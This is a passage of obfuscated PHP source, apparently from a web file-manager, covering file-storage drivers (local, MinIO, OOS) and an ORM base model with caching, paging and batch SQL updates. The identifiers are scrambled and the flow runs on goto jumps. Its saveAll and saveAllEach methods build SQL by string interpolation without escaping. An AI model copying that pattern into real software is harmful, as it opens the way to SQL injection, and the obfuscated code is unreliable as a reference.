@file_put_contents($eİ²Â©Ö¡÷, $E±½Ñ´…êõ, LOCK_EX); clearstatcache(); return $cêÙŠÉ££ === !1 ? !1 : !0; } public function fileSubstr($a„ŸîÀÉ¥, $fËˆ…‡¢š¦ = 0, $eéù¾çÊºĞ = false) { goto BÈ´¯ÚÏ”Ñ; Fà‚²ª³¯Í: return $E¤•ªí¹•Ñ; goto f¡¨é¤¯«¶; BÈ´¯ÚÏ”Ñ: $eÓÄÜ¼âÜï =& $_SERVER[Æ¼ôºÙï]; $a„ŸîÀÉ¥ = $this->iconvSystem($a„ŸîÀÉ¥); if ($eéù¾çÊºĞ === !1) { $eéù¾çÊºĞ = $this->size($a„ŸîÀÉ¥); } goto eá÷ƒŒƒë; eá÷ƒŒƒë: if ($eéù¾çÊºĞ <= 0) { return $eÓÄÜ¼âÜï[33]; } $EéùÚÇíî– = fopen($a„ŸîÀÉ¥, $eÓÄÜ¼âÜï[1234]); if (!$EéùÚÇíî–) { return !1; } goto d”ÌŠ‹†ˆÊ; d”ÌŠ‹†ˆÊ: fseek_64($EéùÚÇíî–, $fËˆ…‡¢š¦); $E¤•ªí¹•Ñ = fread($EéùÚÇíî–, $eéù¾çÊºĞ); fclose($EéùÚÇíî–); goto Fà‚²ª³¯Í; f¡¨é¤¯«¶: } public function upload($CôÛôœ©Ş‚, $Cµß ­Ñº, $E†ƒ¯§Éò = false, $BÙğ›Ùâ£É = REPEAT_REPLACE) { $dÁ¢äó˜¹Û = $this->copyFile($Cµß ­Ñº, $CôÛôœ©Ş‚); return $dÁ¢äó˜¹Û ? $this->getPathOuter($CôÛôœ©Ş‚) : !1; } public function setModifyTime($Dªì•¬¯, $A£Ù´™ˆÀë = '') { @touch($Dªì•¬¯, intval($A£Ù´™ˆÀë)); } public function download($aôŸë´ï‡„, $BõòİÏØõì) { return $this->iconvSystem($aôŸë´ï‡„); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Aµ‚ëß†³ğ) { parent::__construct($Aµ‚ëß†³ğ); $this->signatureVersion($_SERVER[Æ¼ôºÙï][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($dƒ‹§Ç‹Õ) { parent::__construct($dƒ‹§Ç‹Õ); $this->signatureVersion($_SERVER[Æ¼ôºÙï][210]); } public function fileOutLink($A…ÅŒŒ¬Û‚) { $b‹áÂ”‡Ç‡ =& $_SERVER[Æ¼ôºÙï]; if (substr($A…ÅŒŒ¬Û‚, 0, 7) == $b‹áÂ”‡Ç‡[1180]) { $A…ÅŒŒ¬Û‚ = $b‹áÂ”‡Ç‡[1181] . substr($A…ÅŒŒ¬Û‚, 7); } header($b‹áÂ”‡Ç‡[158] . $A…ÅŒŒ¬Û‚); die; } } goto D×Ä¤ŒòĞ; FŠ…Ÿ––®: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\x66\171\x54\151\155\145", "\x74\151\155\x65", "\x69\156\163\145\162\164\x2c\165\x70\144\x61\x74\145", "\146\x75\156\143\x74\151\x6f\x6e"), array("\x63\162\145\x61\x74\145\x54\x69\155\x65", "\x74\151\x6d\x65", "\151\x6e\x73\x65\162\x74", "\x66\165\x6e\x63\x74\x69\157\156")); public function setDataAuto($A‰õ…†ÉÙ¸) { $this->dataAuto = $A‰õ…†ÉÙ¸; } public function __construct($cæÓ‡Âç¢› = '', $BÏ•Á•†´Ì = '', $fİõƒÑƒ¯Ó = '') { parent::__construct($cæÓ‡Âç¢›, $BÏ•Á•†´Ì, $fİõƒÑƒ¯Ó); } public static function textEncode($AÙ¯ÓÜ÷ Ÿ) { if (!$AÙ¯ÓÜ÷ Ÿ) { return $AÙ¯ÓÜ÷ Ÿ; } $Cá‚Œ¿êÙ = json_encode($AÙ¯ÓÜ÷ Ÿ); $Cá‚Œ¿êÙ = preg_replace_callback($_SERVER[Æ¼ôºÙï][351], function ($c¥…¤Û•…) { return addslashes($c¥…¤Û•…[0]); }, $Cá‚Œ¿êÙ); return json_decode($Cá‚Œ¿êÙ); } public static function textDecode($eÛ”íæ™†À) { $f³ƒéÚèÒ =& $_SERVER[Æ¼ôºÙï]; $cêóÊÁªê = json_encode($eÛ”íæ™†À); $cêóÊÁªê = preg_replace_callback($f³ƒéÚèÒ[352], function ($a¶Ç²Ş‹±ì) { return $_SERVER[Æ¼ôºÙï][96]; }, $cêóÊÁªê); return json_decode($cêóÊÁªê); } protected $tableMeta = array(); protected function _beforeInsert(&$fÔ©«›‡İ, $a–¤©Şåµˆ) { $CÅß’‚òÌ… =& $_SERVER[Æ¼ôºÙï]; if (!$this->checkDataAutoHas($CÅß’‚òÌ…[353])) { return; } $this->dataBeforeFilter($fÔ©«›‡İ, $CÅß’‚òÌ…[353]); } protected function _beforeUpdate(&$f¼â ÚËÈ, $Bµİö™¦Ú) { $b‚ÎÖ¾ƒˆÂ =& $_SERVER[Æ¼ôºÙï]; if (!$this->checkDataAutoHas($b‚ÎÖ¾ƒˆÂ[354])) { return; } $this->dataBeforeFilter($f¼â ÚËÈ, $b‚ÎÖ¾ƒˆÂ[354]); } protected function _afterSelect(&$e˜˜É‡‰±, $B§ªœÎÃ‘±) { if (!is_array($e˜˜É‡‰±)) { return; } if (!$this->checkDataAutoHas($_SERVER[Æ¼ôºÙï][355])) { return; } foreach ($e˜˜É‡‰± as &$DÚª‚öô“¢) { $this->dataAfterFilter($DÚª‚öô“¢); } unset($DÚª‚öô“¢); } protected function _afterFind(&$a¹§…ñƒ¿¶, $cŒ“à»Õñô) { if (!is_array($a¹§…ñƒ¿¶)) { return; } if (!$this->checkDataAutoHas($_SERVER[Æ¼ôºÙï][355])) { return; } $this->dataAfterFilter($a¹§…ñƒ¿¶); } public function setAutoIncrement($eœå—ê°á§) { $Dï¬¡Õå‡¬ = array($this->getPk() => $eœå—ê°á§); $eŒñ‘Ìœ„ = $this->data($Dï¬¡Õå‡¬)->add(); if ($eŒñ‘Ìœ„) { $this->delete($eŒñ‘Ìœ„); } } public function getAutoIncrement() { $fØ©ÎÔ¡ = $this->getTableName(); $eÈ­ĞÙä  = $this->max($this->getPk()); $a´Ú™¡Ğß = $this->query("\163\x68\157\167\40\164\x61\142\154\145\x20\163\x74\141\164\x75\x73\40\x77\150\x65\162\145\x20\x4e\x61\155\145\75\47{$fØ©ÎÔ¡}\47"); $BÓß¯ä = $a´Ú™¡Ğß[0][$_SERVER[Æ¼ôºÙï][356]]; $F“‹“ÖÙ…ğ = max($eÈ­ĞÙä , $BÓß¯ä); return $F“‹“ÖÙ…ğ; } protected function _callBefore($eÄ«°¢†Ì³, $E¿§È«Ë‚Ö) { return $this->cacheCallCheck($eÄ«°¢†Ì³, $E¿§È«Ë‚Ö, !1); } protected function _callAfter($Aò‰à…ŞÍ¢, $BèË±°±Ò›) { return $this->cacheCallCheck($Aò‰à…ŞÍ¢, $BèË±°±Ò›, !0); } protected function cacheFunctionAlias($D²Ä²¦ÒÁõ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($DğÎ»ÉÉâ, $Fˆêù»Æ¨µ, $Cõ‰²§İÅ… = false) { $Eè£“ƒŒƒ¾ = $this->cacheFunctionAlias($Fˆêù»Æ¨µ); if (!$Eè£“ƒŒƒ¾) { return; } foreach ($Eè£“ƒŒƒ¾ as $cÓÏæÃİä => $EØÕ©æé›Ë) { $BÙµ›ˆ—’Û = $EØÕ©æé›Ë[0]; $aŠŸòøğç¦ = explode($_SERVER[Æ¼ôºÙï][47], $EØÕ©æé›Ë[1]); if ($DğÎ»ÉÉâ == $cÓÏæÃİä) { return $this->cacheFunctionGet($cÓÏæÃİä, $BÙµ›ˆ—’Û); } if ($Cõ‰²§İÅ… && in_array($DğÎ»ÉÉâ, $aŠŸòøğç¦)) { $this->cacheFunctionClear($cÓÏæÃİä, $BÙµ›ˆ—’Û); } } } public function cacheFunctionGet($eë“©¥½», $FÂ¦¨åÃñˆ) { $cÕºàë¿Æ = $this->cacheKeyMake($eë“©¥½», $FÂ¦¨åÃñˆ); $CÖòŒÎë—ğ = Cache::get($cÕºàë¿Æ); if (!is_array($CÖòŒÎë—ğ)) { $CÖòŒÎë—ğ = call_user_func_array(array($this, $eë“©¥½»), array($FÂ¦¨åÃñˆ, !0)); Cache::set($cÕºàë¿Æ, $CÖòŒÎë—ğ); } return $CÖòŒÎë—ğ; } public function cacheFunctionClear($dÈµƒñİéä, $EƒÒô÷›¿Ö) { $cß¬„ƒ ø = $EƒÒô÷›¿Ö; if (!is_array($EƒÒô÷›¿Ö)) { $cß¬„ƒ ø = array($EƒÒô÷›¿Ö); } foreach ($cß¬„ƒ ø as $E˜ÑºğÛÖ½) { $AÇ‘‡ØÜå = $this->cacheKeyMake($dÈµƒñİéä, $E˜ÑºğÛÖ½); Cache::remove($AÇ‘‡ØÜå); } } private function cacheKeyMake($CÒÒĞ³¨Ò, $Fôòù×Û³•) { $D»¹Ùªë± =& $_SERVER[Æ¼ôºÙï]; return get_class($this) . $D»¹Ùªë±[70] . $CÒÒĞ³¨Ò . $D»¹Ùªë±[357] . $Fôòù×Û³•; } protected function selectPage($e›†Ñ£˜‘ = 200, $dèƒæ¼ÒŒ­ = 1) { goto Fù¬‘Ø©¥£; CŠãø·ò: $eËù¬œ“¬‰ = ceil($d®ÏÎ‰ÈŒÌ / $e›†Ñ£˜‘); $dèƒæ¼ÒŒ­ = intval(isset($in[$a¿“¶­µÖò[349]]) ? $in[$a¿“¶­µÖò[349]] : $dèƒæ¼ÒŒ­); $dèƒæ¼ÒŒ­ = $dèƒæ¼ÒŒ­ <= 1 ? 1 : ($dèƒæ¼ÒŒ­ >= $eËù¬œ“¬‰ ? $eËù¬œ“¬‰ : $dèƒæ¼ÒŒ­); goto b‡‘¥äŒÏ›; eë•ÌÅ‘êõ: $d®ÏÎ‰ÈŒÌ = intval($this->count()); $e›†Ñ£˜‘ = intval($e›†Ñ£˜‘); $e›†Ñ£˜‘ = $e›†Ñ£˜‘ <= 5 ? 5 : ($e›†Ñ£˜‘ >= $d¨ÙÇÓğØø ? $d¨ÙÇÓğØø : $e›†Ñ£˜‘); goto CŠãø·ò; e§¨¢ë¨É›: $d¨ÙÇÓğØø = 4000; $e›†Ñ£˜‘ = isset($in[$a¿“¶­µÖò[358]]) ? $in[$a¿“¶­µÖò[358]] : $e›†Ñ£˜‘; if ($e›†Ñ£˜‘ === -1) { unset($in[$a¿“¶­µÖò[358]]); $d¨ÙÇÓğØø = 100000000; $e›†Ñ£˜‘ = $d¨ÙÇÓğØø; } goto AÄºó¸»¬Â; AÄºó¸»¬Â: $c“ŠĞó–´ = $d¸ìã«ÛŠ¹; $c“ŠĞó–´[$a¿“¶­µÖò[359]] = array(); $this->optionsValue($c“ŠĞó–´); goto eë•ÌÅ‘êõ; Aø¸Å¿ÜÚ: if ($eËù¬œ“¬‰ == 1) { $d®ÏÎ‰ÈŒÌ = count($B©çÎ„‡èÆ); } $AÉÌÊ’ºñ = array($a¿“¶­µÖò[360] => array($a¿“¶­µÖò[361] => $d®ÏÎ‰ÈŒÌ, $a¿“¶­µÖò[358] => $e›†Ñ£˜‘, $a¿“¶­µÖò[349] => $dèƒæ¼ÒŒ­, $a¿“¶­µÖò[362] => $eËù¬œ“¬‰), $a¿“¶­µÖò[363] => $B©çÎ„‡èÆ ? $B©çÎ„‡èÆ : array()); return $AÉÌÊ’ºñ; goto fÂÜ¢äÚ±æ; Fù¬‘Ø©¥£: $a¿“¶­µÖò =& $_SERVER[Æ¼ôºÙï]; global $in; $d¸ìã«ÛŠ¹ = $this->optionsValue(); goto e§¨¢ë¨É›; b‡‘¥äŒÏ›: $this->optionsValue($d¸ìã«ÛŠ¹); $B©çÎ„‡èÆ = $this->page($dèƒæ¼ÒŒ­, $e›†Ñ£˜‘)->select(); $B©çÎ„‡èÆ = is_array($B©çÎ„‡èÆ) ? $B©çÎ„‡èÆ : array(); goto Aø¸Å¿ÜÚ; fÂÜ¢äÚ±æ: } protected function checkLength($E©×Ôö¼åø, $FêÙ³à§‡Ô = 0, $dôÌİÃ¡Ù = '') { $Eà¦ °Š‹’ =& $_SERVER[Æ¼ôºÙï]; $FêÙ³à§‡Ô = $FêÙ³à§‡Ô ? $FêÙ³à§‡Ô : 65536; if (!$E©×Ôö¼åø || strlen($E©×Ôö¼åø) < $FêÙ³à§‡Ô) { return; } $dôÌİÃ¡Ù = $dôÌİÃ¡Ù ? $dôÌİÃ¡Ù . $Eà¦ °Š‹’[67] : $Eà¦ °Š‹’[33]; show_json($dôÌİÃ¡Ù . LNG($Eà¦ °Š‹’[364]) . "\50{$FêÙ³à§‡Ô}\x29", !1); } protected function metaSet($C‰Ù¹¯°£Õ, $c¬¢³Â•¤  = null, $f·¯‹ƒÂ = null) { goto b§ˆçè§Á¾; b§ˆçè§Á¾: $DíÇÚåŸ”Ì =& $_SERVER[Æ¼ôºÙï]; if (!$this->tableMeta || !$C‰Ù¹¯°£Õ) { return !1; } $D ‡àÚø = $this->tableMeta[$DíÇÚåŸ”Ì[365]]; goto cß‡ó°«; cß‡ó°«: $EœŠ¬Şì = $this->tableMeta[$DíÇÚåŸ”Ì[366]]; $DßÆÉµ“· = Model($EœŠ¬Şì); $C÷ªÕä‘ÅÒ = array($D ‡àÚø => $C‰Ù¹¯°£Õ, $DíÇÚåŸ”Ì[367] => $c¬¢³Â•¤ ); goto BÒöÏß¢ïö; aŸèÔ“²¸: if (is_string($c¬¢³Â•¤ )) { $f¡éÒÍàí[$c¬¢³Â•¤ ] = $f·¯‹ƒÂ; } $bãóìš¦¹ = array(); foreach ($f¡éÒÍàí as $c‘–ÔŸÃÛø => $Cª’ø¥ôâÃ) { $this->checkLength($Cª’ø¥ôâÃ, !1, $EœŠ¬Şì . $DíÇÚåŸ”Ì[4] . $c‘–ÔŸÃÛø); $bãóìš¦¹[] = array($D ‡àÚø => $C‰Ù¹¯°£Õ, $DíÇÚåŸ”Ì[92] => $c‘–ÔŸÃÛø, $DíÇÚåŸ”Ì[368] => $Cª’ø¥ôâÃ); } goto D ”ø’…®›; BÒöÏß¢ïö: if (is_null($c¬¢³Â•¤ )) { return $DßÆÉµ“·->where(array($D ‡àÚø => $C‰Ù¹¯°£Õ))->delete(); } if (is_null($f·¯‹ƒÂ) && is_string($c¬¢³Â•¤ )) { return $DßÆÉµ“·->where($C÷ªÕä‘ÅÒ)->delete(); } $f¡éÒÍàí = is_array($c¬¢³Â•¤ ) ? $c¬¢³Â•¤  : array(); goto aŸèÔ“²¸; D ”ø’…®›: $DßÆÉµ“·->where(array($D ‡àÚø => $C‰Ù¹¯°£Õ))->addAll($bãóìš¦¹, array(), !0); return !0; goto c›Ö¸Ù±øë; c›Ö¸Ù±øë: } public function metaGet($c„˜¢ÈÖŒÓ, $c©ªÂØµå¹ = false) { goto cßöó†—÷é; A’´÷„ª…¡: $aºã»Ó¡ = $d‰Êõ÷Ìµ§->field($B‡¥è„¨[369])->where($cêˆ†²õ¨Ğ)->select(); $aºã»Ó¡ = array_to_keyvalue($aºã»Ó¡, $B‡¥è„¨[92], $B‡¥è„¨[368]); return $aºã»Ó¡; goto a¯†à¯†„œ; cßöó†—÷é: $B‡¥è„¨ =& $_SERVER[Æ¼ôºÙï]; if (!$this->tableMeta) { return array(); } $B ò÷‚í = $this->tableMeta[$B‡¥è„¨[365]]; goto AÖŸˆÉÇ…Æ; AÖŸˆÉÇ…Æ: $d‰Êõ÷Ìµ§ = Model($this->tableMeta[$B‡¥è„¨[366]]); if ($c©ªÂØµå¹) { $cêˆ†²õ¨Ğ = array($B ò÷‚í => $c„˜¢ÈÖŒÓ, $B‡¥è„¨[92] => $c©ªÂØµå¹); return $d‰Êõ÷Ìµ§->where($cêˆ†²õ¨Ğ)->getField($B‡¥è„¨[368]); } $cêˆ†²õ¨Ğ = array($B ò÷‚í => $c„˜¢ÈÖŒÓ); goto A’´÷„ª…¡; a¯†à¯†„œ: } private function checkDataAutoHas($e‚äœ¼‰ôù) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $B¡¹é‰·æŒ) { if (in_array($e‚äœ¼‰ôù, explode($_SERVER[Æ¼ôºÙï][47], $B¡¹é‰·æŒ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Bò”ËÈñÈ˜, $aÁ™¹¥µË•) { $c„ÁÃ‘ÁÖÙ =& $_SERVER[Æ¼ôºÙï]; foreach ($this->dataAuto as $A­¹¿¾Ê‰ø) { $F Íàí‰Ñƒ = $A­¹¿¾Ê‰ø[0]; if (!in_array($aÁ™¹¥µË•, explode($c„ÁÃ‘ÁÖÙ[47], $A­¹¿¾Ê‰ø[2]))) { continue; } switch (trim($A­¹¿¾Ê‰ø[3])) { case $c„ÁÃ‘ÁÖÙ[317]: case $c„ÁÃ‘ÁÖÙ[318]: $bå…¶µë„ = $A­¹¿¾Ê‰ø[1]; $CôğÂ„ÀÁÒ = isset($A­¹¿¾Ê‰ø[4]) ? (array) $A­¹¿¾Ê‰ø[4] : array(); if ($bå…¶µë„ == $c„ÁÃ‘ÁÖÙ[195] && array_key_exists($F Íàí‰Ñƒ, $Bò”ËÈñÈ˜)) { if (!$Bò”ËÈñÈ˜[$F Íàí‰Ñƒ]) { unset($Bò”ËÈñÈ˜[$F Íàí‰Ñƒ]); } break; } if (isset($Bò”ËÈñÈ˜[$F Íàí‰Ñƒ])) { array_unshift($CôğÂ„ÀÁÒ, $Bò”ËÈñÈ˜[$F Íàí‰Ñƒ]); } if ($c„ÁÃ‘ÁÖÙ[317] == $A­¹¿¾Ê‰ø[3]) { $Bò”ËÈñÈ˜[$F Íàí‰Ñƒ] = call_user_func_array($bå…¶µë„, $CôğÂ„ÀÁÒ); } else { $Bò”ËÈñÈ˜[$F Íàí‰Ñƒ] = call_user_func_array(array(&$this, $bå…¶µë„), $CôğÂ„ÀÁÒ); } break; case $c„ÁÃ‘ÁÖÙ[269]: $Bò”ËÈñÈ˜[$F Íàí‰Ñƒ] = $Bò”ËÈñÈ˜[$A­¹¿¾Ê‰ø[1]]; break; case $c„ÁÃ‘ÁÖÙ[290]: if (isset($Bò”ËÈñÈ˜[$F Íàí‰Ñƒ]) && !is_string($Bò”ËÈñÈ˜[$F Íàí‰Ñƒ])) { $Bò”ËÈñÈ˜[$F Íàí‰Ñƒ] = json_encode_force($Bò”ËÈñÈ˜[$F Íàí‰Ñƒ]); } break; case $c„ÁÃ‘ÁÖÙ[319]: if ($Bò”ËÈñÈ˜[$F Íàí‰Ñƒ] === $c„ÁÃ‘ÁÖÙ[33]) { unset($Bò”ËÈñÈ˜[$F Íàí‰Ñƒ]); } break; case $c„ÁÃ‘ÁÖÙ[320]: $Bò”ËÈñÈ˜[$F Íàí‰Ñƒ] = $A­¹¿¾Ê‰ø[1]; default: break; } } if ($aÁ™¹¥µË• == $c„ÁÃ‘ÁÖÙ[353]) { $AªĞƒ††Ö› = strtolower($this->db->getDbType()); if (strpos($AªĞƒ††Ö›, $c„ÁÃ‘ÁÖÙ[9]) !== 0) { return; } $aªØÓÚÀëä = $this->field(!0)->fields; $FÁ†Ò›‹šƒ = $aªØÓÚÀëä[$c„ÁÃ‘ÁÖÙ[248]]; if (isset($aªØÓÚÀëä[$c„ÁÃ‘ÁÖÙ[247]])) { unset($FÁ†Ò›‹šƒ[$aªØÓÚÀëä[$c„ÁÃ‘ÁÖÙ[247]]]); } foreach ($FÁ†Ò›‹šƒ as $c¨Ã‰ÕÂ›Û => $aÁ™¹¥µË•) { if (!isset($Bò”ËÈñÈ˜[$c¨Ã‰ÕÂ›Û])) { $Bò”ËÈñÈ˜[$c¨Ã‰ÕÂ›Û] = $c„ÁÃ‘ÁÖÙ[33]; } } } } private function dataAfterFilter(&$aÔ„‚ã ›ä) { $F¯²˜ºåÆê =& $_SERVER[Æ¼ôºÙï]; foreach ($this->dataAuto as $c¢˜øÔ‡ãÜ) { $F½¡ö¡˜Æ¸ = $c¢˜øÔ‡ãÜ[0]; if (!in_array($F¯²˜ºåÆê[355], explode($F¯²˜ºåÆê[47], $c¢˜øÔ‡ãÜ[2]))) { continue; } if (!isset($aÔ„‚ã ›ä[$F½¡ö¡˜Æ¸])) { continue; } switch (trim($c¢˜øÔ‡ãÜ[3])) { case $F¯²˜ºåÆê[317]: case $F¯²˜ºåÆê[318]: $Cİß—ì¿¬ó = isset($c¢˜øÔ‡ãÜ[4]) ? (array) $c¢˜øÔ‡ãÜ[4] : array(); array_unshift($Cİß—ì¿¬ó, $aÔ„‚ã ›ä[$F½¡ö¡˜Æ¸]); if ($F¯²˜ºåÆê[317] == $c¢˜øÔ‡ãÜ[3]) { $aÔ„‚ã ›ä[$F½¡ö¡˜Æ¸] = call_user_func_array($c¢˜øÔ‡ãÜ[1], $Cİß—ì¿¬ó); } else { $aÔ„‚ã ›ä[$F½¡ö¡˜Æ¸] = call_user_func_array(array(&$this, $c¢˜øÔ‡ãÜ[1]), $Cİß—ì¿¬ó); } break; case $F¯²˜ºåÆê[269]: $aÔ„‚ã ›ä[$F½¡ö¡˜Æ¸] = $aÔ„‚ã ›ä[$c¢˜øÔ‡ãÜ[1]]; break; case $F¯²˜ºåÆê[290]: $fâÊ‘½âæÛ = $aÔ„‚ã ›ä[$F½¡ö¡˜Æ¸]; $aÔ„‚ã ›ä[$F½¡ö¡˜Æ¸] = json_decode($fâÊ‘½âæÛ, !0); if (is_null($aÔ„‚ã ›ä[$F½¡ö¡˜Æ¸])) { $aÔ„‚ã ›ä[$F½¡ö¡˜Æ¸] = $fâÊ‘½âæÛ; } break; case $F¯²˜ºåÆê[319]: if ($aÔ„‚ã ›ä[$F½¡ö¡˜Æ¸] === $F¯²˜ºåÆê[33]) { unset($aÔ„‚ã ›ä[$F½¡ö¡˜Æ¸]); } break; case $F¯²˜ºåÆê[320]: $aÔ„‚ã ›ä[$F½¡ö¡˜Æ¸] = $c¢˜øÔ‡ãÜ[1]; default: break; } } } public function saveAll($CÛÈ¦·òõ…) { goto Cáã³èÒ˜; C‰ Ší: $B¦â¡¦Ó— = array(); $aÍ‰ßñÑ = count($CÛÈ¦·òõ…); for ($AğÕ®…šÆô = 0; $AğÕ®…šÆô < $aÍ‰ßñÑ; $AğÕ®…šÆô++) { $C¬ò˜ˆÆÙ¨ = $CÛÈ¦·òõ…[$AğÕ®…šÆô]; if (!is_array($C¬ò˜ˆÆÙ¨) || count($C¬ò˜ˆÆÙ¨) != 4) { continue; } $eÄÕ°– = "\x55\x50\x44\101\x54\x45\x20\140{$fßÛøå”ƒÌ}\x60\40\123\105\x54\x20{$C¬ò˜ˆÆÙ¨[2]}\x20\x3d\40\x43\101\x53\105\x20{$C¬ò˜ˆÆÙ¨[0]}\x20\12"; if ($aŸ‘¦ï»ê == 0) { $a¯ªàÂ‰Ãã = $eÄÕ°–; } $B¦â¡¦Ó—[] = $Dè¡ÏËŞª‘[115] . $C¬ò˜ˆÆÙ¨[1] . $Dè¡ÏËŞª‘[115]; $aŸ‘¦ï»ê++; $a¯ªàÂ‰Ãã .= "\x20\127\x48\105\x4e\x20\47{$C¬ò˜ˆÆÙ¨[1]}\x27\x20\x54\x48\105\116\x20\47{$C¬ò˜ˆÆÙ¨[3]}\x27\40\12"; if ($aŸ‘¦ï»ê == $A¦‰±ší  || $AğÕ®…šÆô == $aÍ‰ßñÑ - 1) { goto dÃåÄŞëƒƒ; aÚŒö¡¥ùÏ: $aŸ‘¦ï»ê = 0; $a¯ªàÂ‰Ãã = $eÄÕ°–; $this->chunkEventCheck(count($B¦â¡¦Ó—)); goto F‰Ì³Ïò¾; dÃåÄŞëƒƒ: $e´‹Ò¼é®‹ = implode($Dè¡ÏËŞª‘[47], $B¦â¡¦Ó—); $a¯ªàÂ‰Ãã .= "\40\x45\x4e\104\x20\x20\x57\x48\105\122\x45\x20{$C¬ò˜ˆÆÙ¨[0]}\x20\111\x4e\40\x28{$e´‹Ò¼é®‹}\x29\x20"; $this->execute($a¯ªàÂ‰Ãã); goto aÚŒö¡¥ùÏ; F‰Ì³Ïò¾: $B¦â¡¦Ó— = array(); goto CŞˆ¬ĞãîÒ; CŞˆ¬ĞãîÒ: } } goto f‘æ ËÂèÕ; f‘æ ËÂèÕ: $this->chunkEventSet(); goto B‡Á‡¸İÆ; C‹¶²İµ: $CÛÈ¦·òõ… = is_array($CÛÈ¦·òõ…) ? $CÛÈ¦·òõ… : array(); $a¯ªàÂ‰Ãã = $Dè¡ÏËŞª‘[370]; $aŸ‘¦ï»ê = 0; goto C‰ Ší; Cáã³èÒ˜: $Dè¡ÏËŞª‘ =& $_SERVER[Æ¼ôºÙï]; $fßÛøå”ƒÌ = $this->tablePrefix . $this->tableName; $A¦‰±ší  = self::SQL_WHERE_IN_CHUNK; goto C‹¶²İµ; B‡Á‡¸İÆ: } public function saveAllEach($Dİàõ÷Ñ´Ã) { $c±ïÌù…‡Š =& $_SERVER[Æ¼ôºÙï]; $Aäá¡ô¡Ú = $this->tablePrefix . $this->tableName; foreach ($Dİàõ÷Ñ´Ã as $eº±Ñ”øÒ¡) { if (!is_array($eº±Ñ”øÒ¡) || count($eº±Ñ”øÒ¡) != 4) { continue; } $DÁƒÒ¸ÁóÇ = $eº±Ñ”øÒ¡[0] . $c±ïÌù…‡Š[371] . $eº±Ñ”øÒ¡[1] . $c±ïÌù…‡Š[115]; $AíçÂ“£Õİ = $eº±Ñ”øÒ¡[2] . $c±ïÌù…‡Š[371] . $eº±Ñ”øÒ¡[3] . $c±ïÌù…‡Š[115]; $cĞØƒ‘ªÏ· = "\x75\x70\144\141\164\145\40{$Aäá¡ô¡Ú}\40\163\145\164\40{$AíçÂ“£Õİ}\40\167\150\x65\x72\145\x20{$DÁƒÒ¸ÁóÇ}\x3b"; $this->execute($cĞØƒ‘ªÏ·); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($e´­‰éßÓ = false, $Aå›í‡¯åĞ = false) { $this->_chunkEvent = $e´­‰éßÓ; $this->_chunkEventParam = $Aå›í‡¯åĞ; } private function chunkEventCheck($a£´Ç„‘Â) { if (!$this->_chunkEvent) { return; } $Fá¡êŞ„³â = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Fá¡êŞ„³â[$_SERVER[Æ¼ôºÙï][372]] = $a£´Ç„‘Â; Hook::trigger($this->_chunkEvent, $Fá¡êŞ„³â); } public function addAll($d´æ´Ğ’­š, $AÉ©¦Áš³¼ = array(), $aÑÇŠËÁõ  = false) { goto BÀ«Ø—ªÃ»; eÕ›µ¿¶À: if (empty($d´æ´Ğ’­š)) { $this->error = think_lang($AˆÃ×øÉã[267]); return !1; } $AÉ©¦Áš³¼ = $this->_parseOptions($AÉ©¦Áš³¼); foreach ($d´æ´Ğ’­š as $F¥ÖÂ†£ ¥ => $eº¯–§·Â) { $d´æ´Ğ’­š[$F¥ÖÂ†£ ¥] = $this->_facade($eº¯–§·Â); $this->_beforeInsert($d´æ´Ğ’­š[$F¥ÖÂ†£ ¥], $AÉ©¦Áš³¼); } goto b¤ÊÜô¶Èë; BÀ«Ø—ªÃ»: $AˆÃ×øÉã =& $_SERVER[Æ¼ôºÙï]; ignore_timeout(); $CÛòƒ…„˜— = self::SQL_WHERE_IN_CHUNK; goto eÕ›µ¿¶À; b¤ÊÜô¶Èë: if (method_exists($this->db, $AˆÃ×øÉã[268])) { for ($B¸ ´Í˜– = 0; $B¸ ´Í˜– < count($d´æ´Ğ’­š); $B¸ ´Í˜– += $CÛòƒ…„˜—) { $DÌ‰“æ‰ÁÜ = array_slice($d´æ´Ğ’­š, $B¸ ´Í˜–, $CÛòƒ…„˜—); if (!is_array($DÌ‰“æ‰ÁÜ) || count($DÌ‰“æ‰ÁÜ) == 0) { break; } $Bàâ›•Î˜ = $this->db->insertAll($DÌ‰“æ‰ÁÜ, $AÉ©¦Áš³¼, $aÑÇŠËÁõ ); $this->chunkEventCheck(count($DÌ‰“æ‰ÁÜ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($d´æ´Ğ’­š as $F¥ÖÂ†£ ¥ => $eº¯–§·Â) { $Bàâ›•Î˜ = $this->db->insert($eº¯–§·Â, $AÉ©¦Áš³¼, $aÑÇŠËÁõ ); } $this->commit(); } if (!1 !== $Bàâ›•Î˜) { $fÈŸ‡²–Ç„ = $this->getLastInsID(); if ($fÈŸ‡²–Ç„) { return $fÈŸ‡²–Ç„; } } return $Bàâ›•Î˜; goto BÎë˜ï‡¢£; BÎë˜ï‡¢£: } public function save($Eå‹‹ÊöĞí = '', $döñÒŒ‚Ô» = array()) { goto f’ ªœÂ­; f’ ªœÂ­: $E‘¤ä®ÚØ³ =& $_SERVER[Æ¼ôºÙï]; $EÜÉŠÕ–ß = self::SQL_WHERE_IN_CHUNK; $fá™Ûá‡‘Å = $this->optionsValue(); goto e•ÌÁõ‘¸®; e•ÌÁõ‘¸®: $B¶ãÄŒ«šİ = $this->findWhereField($fá™Ûá‡‘Å); if (!$B¶ãÄŒ«šİ) { return parent::save($Eå‹‹ÊöĞí, $döñÒŒ‚Ô»); } $dò’°‹õ×ª = 0; goto d·©¾ªÀÂÕ; FÕÕ‚‹¶: for ($aš”ˆ‹ßˆ» = 0; $aš”ˆ‹ßˆ» < $D¦Õ«Ê„¾Æ; $aš”ˆ‹ßˆ» += $EÜÉŠÕ–ß) { $c‚¼æ–ßêš = array_slice($f½¦â÷ä§†, $aš”ˆ‹ßˆ», $EÜÉŠÕ–ß); if (!is_array($c‚¼æ–ßêš) || count($c‚¼æ–ßêš) == 0) { break; } 